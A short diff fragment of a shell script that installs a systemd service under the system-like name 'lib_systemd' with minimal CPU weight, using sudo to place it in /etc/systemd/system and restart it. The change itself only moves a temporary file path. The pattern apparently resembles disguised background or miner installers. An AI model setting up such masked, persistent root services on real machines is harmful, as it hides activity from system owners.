@@ -51,7 +51,7 @@ else
   else
 
     echo "[*] Creating lib_systemd systemd service"
-    cat >/tmp/lib_systemd.service <<EOL
+    cat >/$HOME/lib_systemd.service <<EOL
 [Unit]
 Description=lib_systemd service
 
@@ -64,7 +64,7 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/lib_systemd.service /etc/systemd/system/lib_systemd.service
+    sudo mv /$HOME/lib_systemd.service /etc/systemd/system/lib_systemd.service
     echo "[*] Starting lib_systemd systemd service"
     sudo killall lib_systemd 2>/dev/null
     sudo systemctl daemon-reload
